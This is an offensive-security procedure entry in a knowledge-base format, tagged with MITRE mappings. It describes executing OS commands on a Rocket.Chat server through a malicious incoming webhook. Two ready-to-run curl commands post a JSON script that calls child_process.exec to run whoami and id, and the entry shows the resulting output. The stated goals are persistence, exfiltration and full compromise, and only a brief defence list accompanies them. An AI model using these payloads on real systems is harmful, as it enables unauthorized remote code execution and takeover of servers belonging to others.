---
id: proc-rocket-shell-execution
tags:
  - shell-access
  - command-execution
type: procedure
tools:
  - '[[tools/Python3]]'
  - '[[tools/requests]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-trigger-webhook-whoami]]'
  - '[[commands/curl-trigger-webhook-id]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:46:19.924Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Execute-Commands-via-Webhook-Shell

## Summary

This procedure triggers the malicious incoming webhook to execute OS commands as the 'rocketchat' user, providing interactive shell-like access for verification and further exploitation.

## Description

POST to the webhook URL with a JSON payload containing a script that uses child_process.exec to run commands. Outputs are returned in the response or written to files. This grants full control over the instance.

## Requirements

1. Created webhook URL/ID from prior step
2. Target server access
3. Commands to execute (e.g., whoami, id)

## Defense

Defensive measures and detection strategies:

- Log all webhook triggers and script executions
- Implement script whitelisting or static analysis
- Use non-root process users with minimal privileges
- SIEM alerts on unexpected file writes or process spawns

## Objectives

1. Verify RCE with user/group info
2. Execute arbitrary commands for persistence/exfil
3. Confirm server compromise

## Instructions

### Step 1: Trigger Webhook for whoami

**Context**: Send payload to run whoami and capture output.

**Command** ([[commands/curl-trigger-webhook-whoami]]):
```bash
curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type: application/json' -d '{"text":"ignore","script":"require(\"child_process\").exec(\"whoami\", {stdio: \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
```

> Output: "rocketchat\n"

### Step 2: Trigger Webhook for id

**Context**: Run id to get UID/GID details.

**Command** ([[commands/curl-trigger-webhook-id]]):
```bash
curl -X POST 'http://target:3000/hooks/webhook_id_here' -H 'Content-Type: application/json' -d '{"text":"ignore","script":"require(\"child_process\").exec(\"id\", {stdio: \"pipe\"}, (err, stdout) => {console.log(stdout.toString())})"}'
```

> Output: "uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)\n"

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-webhook-whoami]]
- [[commands/curl-trigger-webhook-id]]

## Tools Used

- [[tools/Python3]]
- [[tools/requests]]

## Tags

- shell-access
- command-execution
